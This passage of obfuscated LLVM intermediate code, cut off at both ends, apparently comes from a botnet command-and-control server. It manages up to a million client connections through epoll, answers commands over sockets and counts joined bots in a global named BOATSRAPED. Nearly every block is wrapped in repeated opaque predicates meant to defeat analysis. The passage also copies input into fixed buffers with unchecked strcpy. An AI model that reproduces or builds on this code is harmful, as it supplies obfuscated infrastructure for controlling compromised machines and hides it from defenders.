originalBBpart251:                                ; preds = %originalBB49
  br label %294

; <label>:294:                                    ; preds = %originalBBpart251, %185
  store i32 0, i32* %15, align 4
  store i32 0, i32* %12, align 4
  br label %295

; <label>:295:                                    ; preds = %340, %294
  %296 = load i32, i32* %12, align 4
  %297 = icmp slt i32 %296, 1000000
  br i1 %297, label %298, label %343

; <label>:298:                                    ; preds = %295
  %299 = load i32, i32* %12, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %300
  %302 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %301, i32 0, i32 3
  %303 = load i8, i8* %302, align 1
  %304 = icmp ne i8 %303, 0
  br i1 %304, label %305, label %309

; <label>:305:                                    ; preds = %298
  %306 = load i32, i32* %12, align 4
  %307 = load i32, i32* %11, align 4
  %308 = icmp eq i32 %306, %307
  br i1 %308, label %309, label %310

; <label>:309:                                    ; preds = %305, %298
  br label %340

; <label>:310:                                    ; preds = %305
  %311 = load i32, i32* %12, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %312
  %314 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 4
  %316 = load i32, i32* %11, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %317
  %319 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %318, i32 0, i32 0
  %320 = load i32, i32* %319, align 4
  %321 = icmp eq i32 %315, %320
  br i1 %321, label %322, label %339

; <label>:322:                                    ; preds = %310
  %323 = load i32, i32* @x.7
  %324 = load i32, i32* @y.8
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %322
  store i32 1, i32* %15, align 4
  %331 = load i32, i32* @x.7
  %332 = load i32, i32* @y.8
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %343

; <label>:339:                                    ; preds = %310
  br label %340

; <label>:340:                                    ; preds = %339, %309
  %341 = load i32, i32* %12, align 4
  %342 = add nsw i32 %341, 1
  store i32 %342, i32* %12, align 4
  br label %295

; <label>:343:                                    ; preds = %originalBBpart255, %295
  %344 = load i32, i32* @x.7
  %345 = load i32, i32* @y.8
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %343
  %352 = load i32, i32* %15, align 4
  %353 = icmp ne i32 %352, 0
  %354 = load i32, i32* @x.7
  %355 = load i32, i32* @y.8
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %353, label %362, label %372

; <label>:362:                                    ; preds = %originalBBpart259
  %363 = load i32, i32* %11, align 4
  %364 = call i64 @send(i32 %363, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i32 0, i32 0), i64 8, i32 16384)
  %365 = icmp eq i64 %364, -1
  br i1 %365, label %366, label %369

; <label>:366:                                    ; preds = %362
  %367 = load i32, i32* %11, align 4
  %368 = call i32 @close(i32 %367)
  br label %154

; <label>:369:                                    ; preds = %362
  %370 = load i32, i32* %11, align 4
  %371 = call i32 @close(i32 %370)
  br label %154

; <label>:372:                                    ; preds = %originalBBpart259
  %373 = load i32, i32* %11, align 4
  %374 = call i32 @make_socket_non_blocking(i32 %373)
  store i32 %374, i32* %6, align 4
  %375 = load i32, i32* %6, align 4
  %376 = icmp eq i32 %375, -1
  br i1 %376, label %377, label %380

; <label>:377:                                    ; preds = %372
  %378 = load i32, i32* %11, align 4
  %379 = call i32 @close(i32 %378)
  br label %398

; <label>:380:                                    ; preds = %372
  %381 = load i32, i32* %11, align 4
  %382 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %383 = bitcast %union.epoll_data* %382 to i32*
  store i32 %381, i32* %383, align 1
  %384 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %384, align 1
  %385 = load volatile i32, i32* @epollFD, align 4
  %386 = load i32, i32* %11, align 4
  %387 = call i32 @epoll_ctl(i32 %385, i32 1, i32 %386, %struct.epoll_event* %4) #7
  store i32 %387, i32* %6, align 4
  %388 = load i32, i32* %6, align 4
  %389 = icmp eq i32 %388, -1
  br i1 %389, label %390, label %393

; <label>:390:                                    ; preds = %380
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  %391 = load i32, i32* %11, align 4
  %392 = call i32 @close(i32 %391)
  br label %398

; <label>:393:                                    ; preds = %380
  %394 = load i32, i32* %11, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %395
  %397 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %396, i32 0, i32 3
  store i8 1, i8* %397, align 1
  br label %154

; <label>:398:                                    ; preds = %390, %377, %originalBBpart239, %167
  br label %645

; <label>:399:                                    ; preds = %143
  %400 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %401 = load i32, i32* %8, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %400, i64 %402
  %404 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %403, i32 0, i32 1
  %405 = bitcast %union.epoll_data* %404 to i32*
  %406 = load i32, i32* %405, align 1
  store i32 %406, i32* %16, align 4
  %407 = load i32, i32* %16, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %408
  store %struct.clientdata_t* %409, %struct.clientdata_t** %17, align 8
  store i32 0, i32* %18, align 4
  %410 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %411 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %410, i32 0, i32 3
  store i8 1, i8* %411, align 1
  br label %412

; <label>:412:                                    ; preds = %617, %399
  %413 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %413, i8 0, i64 2048, i32 16, i1 false)
  br label %414

; <label>:414:                                    ; preds = %originalBBpart275, %518, %originalBBpart271, %466, %452, %412
  %415 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %415, i8 0, i64 2048, i32 16, i1 false)
  %416 = icmp ne i8* %415, null
  br i1 %416, label %417, label %423

; <label>:417:                                    ; preds = %414
  %418 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %419 = load i32, i32* %16, align 4
  %420 = call i32 @fdgets(i8* %418, i32 2048, i32 %419)
  %421 = sext i32 %420 to i64
  store i64 %421, i64* %19, align 8
  %422 = icmp sgt i64 %421, 0
  br label %423

; <label>:423:                                    ; preds = %417, %414
  %424 = phi i1 [ false, %414 ], [ %422, %417 ]
  br i1 %424, label %425, label %539

; <label>:425:                                    ; preds = %423
  %426 = load i32, i32* @x.7
  %427 = load i32, i32* @y.8
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %425
  %434 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %435 = call i8* @strstr(i8* %434, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0)) #8
  %436 = icmp eq i8* %435, null
  %437 = load i32, i32* @x.7
  %438 = load i32, i32* @y.8
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %436, label %445, label %446

; <label>:445:                                    ; preds = %originalBBpart263
  store i32 1, i32* %18, align 4
  br label %539

; <label>:446:                                    ; preds = %originalBBpart263
  %447 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @trim(i8* %447)
  %448 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %449 = call i8* @strstr(i8* %448, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0)) #8
  %450 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %451 = icmp eq i8* %449, %450
  br i1 %451, label %452, label %461

; <label>:452:                                    ; preds = %446
  %453 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %454 = call i8* @strstr(i8* %453, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0)) #8
  %455 = getelementptr inbounds i8, i8* %454, i64 7
  store i8* %455, i8** %21, align 8
  %456 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %457 = load i8*, i8** %21, align 8
  %458 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %456, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0), i8* %457)
  %459 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %460 = call i32 @fflush(%struct._IO_FILE* %459)
  br label %414

; <label>:461:                                    ; preds = %446
  %462 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %463 = call i8* @strstr(i8* %462, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0)) #8
  %464 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %465 = icmp eq i8* %463, %464
  br i1 %465, label %466, label %472

; <label>:466:                                    ; preds = %461
  %467 = load volatile i32, i32* @BOATSRAPED, align 4
  %468 = add nsw i32 %467, 1
  store volatile i32 %468, i32* @BOATSRAPED, align 4
  %469 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %470 = call i8* @strstr(i8* %469, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0)) #8
  %471 = getelementptr inbounds i8, i8* %470, i64 11
  store i8* %471, i8** %22, align 8
  br label %414

; <label>:472:                                    ; preds = %461
  %473 = load i32, i32* @x.7
  %474 = load i32, i32* @y.8
  %475 = sub i32 %473, 1
  %476 = mul i32 %473, %475
  %477 = urem i32 %476, 2
  %478 = icmp eq i32 %477, 0
  %479 = icmp slt i32 %474, 10
  %480 = or i1 %478, %479
  br i1 %480, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %472
  %481 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %482 = call i32 @strcmp(i8* %481, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %483 = icmp eq i32 %482, 0
  %484 = load i32, i32* @x.7
  %485 = load i32, i32* @y.8
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %483, label %492, label %514

; <label>:492:                                    ; preds = %originalBBpart267
  %493 = load i32, i32* %16, align 4
  %494 = call i64 @send(i32 %493, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i64 5, i32 16384)
  %495 = icmp eq i64 %494, -1
  br i1 %495, label %496, label %497

; <label>:496:                                    ; preds = %492
  store i32 1, i32* %18, align 4
  br label %539

; <label>:497:                                    ; preds = %492
  %498 = load i32, i32* @x.7
  %499 = load i32, i32* @y.8
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %497
  %506 = load i32, i32* @x.7
  %507 = load i32, i32* @y.8
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %414

; <label>:514:                                    ; preds = %originalBBpart267
  %515 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %516 = call i32 @strcmp(i8* %515, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i32 0, i32 0)) #8
  %517 = icmp eq i32 %516, 0
  br i1 %517, label %518, label %519

; <label>:518:                                    ; preds = %514
  br label %414

; <label>:519:                                    ; preds = %514
  %520 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %521 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i32 0, i32 0), i8* %520)
  br label %522

; <label>:522:                                    ; preds = %519
  %523 = load i32, i32* @x.7
  %524 = load i32, i32* @y.8
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %522
  %531 = load i32, i32* @x.7
  %532 = load i32, i32* @y.8
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %414

; <label>:539:                                    ; preds = %496, %445, %423
  %540 = load i32, i32* @x.7
  %541 = load i32, i32* @y.8
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %539
  %548 = load i64, i64* %19, align 8
  %549 = icmp eq i64 %548, -1
  %550 = load i32, i32* @x.7
  %551 = load i32, i32* @y.8
  %552 = sub i32 %550, 1
  %553 = mul i32 %550, %552
  %554 = urem i32 %553, 2
  %555 = icmp eq i32 %554, 0
  %556 = icmp slt i32 %551, 10
  %557 = or i1 %555, %556
  br i1 %557, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br i1 %549, label %558, label %612

; <label>:558:                                    ; preds = %originalBBpart279
  %559 = load i32, i32* @x.7
  %560 = load i32, i32* @y.8
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %558
  %567 = call i32* @__errno_location() #9
  %568 = load i32, i32* %567, align 4
  %569 = icmp ne i32 %568, 11
  %570 = load i32, i32* @x.7
  %571 = load i32, i32* @y.8
  %572 = sub i32 %570, 1
  %573 = mul i32 %570, %572
  %574 = urem i32 %573, 2
  %575 = icmp eq i32 %574, 0
  %576 = icmp slt i32 %571, 10
  %577 = or i1 %575, %576
  br i1 %577, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %569, label %578, label %595

; <label>:578:                                    ; preds = %originalBBpart283
  %579 = load i32, i32* @x.7
  %580 = load i32, i32* @y.8
  %581 = sub i32 %579, 1
  %582 = mul i32 %579, %581
  %583 = urem i32 %582, 2
  %584 = icmp eq i32 %583, 0
  %585 = icmp slt i32 %580, 10
  %586 = or i1 %584, %585
  br i1 %586, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %578
  store i32 1, i32* %18, align 4
  %587 = load i32, i32* @x.7
  %588 = load i32, i32* @y.8
  %589 = sub i32 %587, 1
  %590 = mul i32 %587, %589
  %591 = urem i32 %590, 2
  %592 = icmp eq i32 %591, 0
  %593 = icmp slt i32 %588, 10
  %594 = or i1 %592, %593
  br i1 %594, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %595

; <label>:595:                                    ; preds = %originalBBpart287, %originalBBpart283
  %596 = load i32, i32* @x.7
  %597 = load i32, i32* @y.8
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %595
  %604 = load i32, i32* @x.7
  %605 = load i32, i32* @y.8
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %618

; <label>:612:                                    ; preds = %originalBBpart279
  %613 = load i64, i64* %19, align 8
  %614 = icmp eq i64 %613, 0
  br i1 %614, label %615, label %616

; <label>:615:                                    ; preds = %612
  store i32 1, i32* %18, align 4
  br label %618

; <label>:616:                                    ; preds = %612
  br label %617

; <label>:617:                                    ; preds = %616
  br label %412

; <label>:618:                                    ; preds = %615, %originalBBpart291
  %619 = load i32, i32* %18, align 4
  %620 = icmp ne i32 %619, 0
  br i1 %620, label %621, label %626

; <label>:621:                                    ; preds = %618
  %622 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %623 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %622, i32 0, i32 3
  store i8 0, i8* %623, align 1
  %624 = load i32, i32* %16, align 4
  %625 = call i32 @close(i32 %624)
  br label %626

; <label>:626:                                    ; preds = %621, %618
  %627 = load i32, i32* @x.7
  %628 = load i32, i32* @y.8
  %629 = sub i32 %627, 1
  %630 = mul i32 %627, %629
  %631 = urem i32 %630, 2
  %632 = icmp eq i32 %631, 0
  %633 = icmp slt i32 %628, 10
  %634 = or i1 %632, %633
  br i1 %634, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %626
  %635 = load i32, i32* @x.7
  %636 = load i32, i32* @y.8
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %643

; <label>:643:                                    ; preds = %originalBBpart295
  br label %644

; <label>:644:                                    ; preds = %643
  br label %645

; <label>:645:                                    ; preds = %644, %398, %124
  %646 = load i32, i32* %8, align 4
  %647 = add nsw i32 %646, 1
  store i32 %647, i32* %8, align 4
  br label %29

; <label>:648:                                    ; preds = %originalBBpart2
  br label %25
                                                  ; No predecessors!
  %650 = load i32, i32* @x.7
  %651 = load i32, i32* @y.8
  %652 = sub i32 %650, 1
  %653 = mul i32 %650, %652
  %654 = urem i32 %653, 2
  %655 = icmp eq i32 %654, 0
  %656 = icmp slt i32 %651, 10
  %657 = or i1 %655, %656
  br i1 %657, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %649
  %658 = load i8*, i8** %2, align 8
  %659 = load i32, i32* @x.7
  %660 = load i32, i32* @y.8
  %661 = sub i32 %659, 1
  %662 = mul i32 %659, %661
  %663 = urem i32 %662, 2
  %664 = icmp eq i32 %663, 0
  %665 = icmp slt i32 %660, 10
  %666 = or i1 %664, %665
  br i1 %666, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  ret i8* %658

originalBBalteredBB:                              ; preds = %originalBB, %29
  %667 = load i32, i32* %8, align 4
  %668 = load i32, i32* %7, align 4
  %669 = icmp slt i32 %667, %668
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %670 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %671 = load i32, i32* %8, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %670, i64 %672
  %674 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %673, i32 0, i32 0
  %675 = load i32, i32* %674, align 1
  %_ = sub i32 0, %675
  %gen = add i32 %_, 8
  %_2 = sub i32 %675, 8
  %gen3 = mul i32 %_2, 8
  %_4 = sub i32 %675, 8
  %gen5 = mul i32 %_4, 8
  %_6 = shl i32 %675, 8
  %_7 = sub i32 %675, 8
  %gen8 = mul i32 %_7, 8
  %676 = and i32 %675, 8
  %677 = icmp ne i32 %676, 0
  br label %originalBB1

originalBB12alteredBB:                            ; preds = %originalBB12, %74
  %678 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %679 = load i32, i32* %8, align 4
  %680 = sext i32 %679 to i64
  %681 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %678, i64 %680
  %682 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %681, i32 0, i32 0
  %683 = load i32, i32* %682, align 1
  %_13 = shl i32 %683, 16
  %_14 = shl i32 %683, 16
  %_15 = sub i32 0, %683
  %gen16 = add i32 %_15, 16
  %_17 = sub i32 0, %683
  %gen18 = add i32 %_17, 16
  %_19 = shl i32 %683, 16
  %_20 = sub i32 0, %683
  %gen21 = add i32 %_20, 16
  %684 = and i32 %683, 16
  %685 = icmp ne i32 %684, 0
  br label %originalBB12

originalBB25alteredBB:                            ; preds = %originalBB25, %99
  %686 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %687 = load i32, i32* %8, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %686, i64 %688
  %690 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %689, i32 0, i32 0
  %691 = load i32, i32* %690, align 1
  %_26 = sub i32 0, %691
  %gen27 = add i32 %_26, 1
  %_28 = sub i32 %691, 1
  %gen29 = mul i32 %_28, 1
  %_30 = sub i32 0, %691
  %gen31 = add i32 %_30, 1
  %_32 = sub i32 %691, 1
  %gen33 = mul i32 %_32, 1
  %692 = and i32 %691, 1
  %693 = icmp ne i32 %692, 0
  br label %originalBB25

originalBB37alteredBB:                            ; preds = %originalBB37, %168
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0))
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %201
  %694 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @trim(i8* %694)
  %695 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @removestr(i8* %695, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0))
  %696 = load i32, i32* %11, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %697
  %699 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %698, i32 0, i32 2
  %700 = getelementptr inbounds [512 x i8], [512 x i8]* %699, i32 0, i32 0
  %701 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %702 = call i8* @strcpy(i8* %700, i8* %701) #7
  store i32 0, i32* %14, align 4
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %249
  %703 = load i32, i32* %14, align 4
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %704
  %706 = getelementptr inbounds %struct.name, %struct.name* %705, i32 0, i32 0
  %707 = getelementptr inbounds [512 x i8], [512 x i8]* %706, i32 0, i32 0
  %708 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %709 = call i8* @strcpy(i8* %707, i8* %708) #7
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %277
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %322
  store i32 1, i32* %15, align 4
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %343
  %710 = load i32, i32* %15, align 4
  %711 = icmp ne i32 %710, 0
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %425
  %712 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %713 = call i8* @strstr(i8* %712, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0)) #8
  %714 = icmp eq i8* %713, null
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %472
  %715 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %716 = call i32 @strcmp(i8* %715, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %717 = icmp eq i32 %716, 0
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %497
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %522
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %539
  %718 = load i64, i64* %19, align 8
  %719 = icmp eq i64 %718, -1
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %558
  %720 = call i32* @__errno_location() #9
  %721 = load i32, i32* %720, align 4
  %722 = icmp ne i32 %721, 11
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %578
  store i32 1, i32* %18, align 4
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %595
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %626
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %649
  %723 = load i8*, i8** %2, align 8
  br label %originalBB97
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #4

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #3

declare void @perror(i8*) #1

declare i32 @usleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %27

; <label>:10:                                     ; preds = %1
  %11 = load i32, i32* @x.9
  %12 = load i32, i32* @y.10
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  %19 = load i32, i32* @x.9
  %20 = load i32, i32* @y.10
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %69

; <label>:27:                                     ; preds = %1
  %28 = load i32, i32* @x.9
  %29 = load i32, i32* @y.10
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
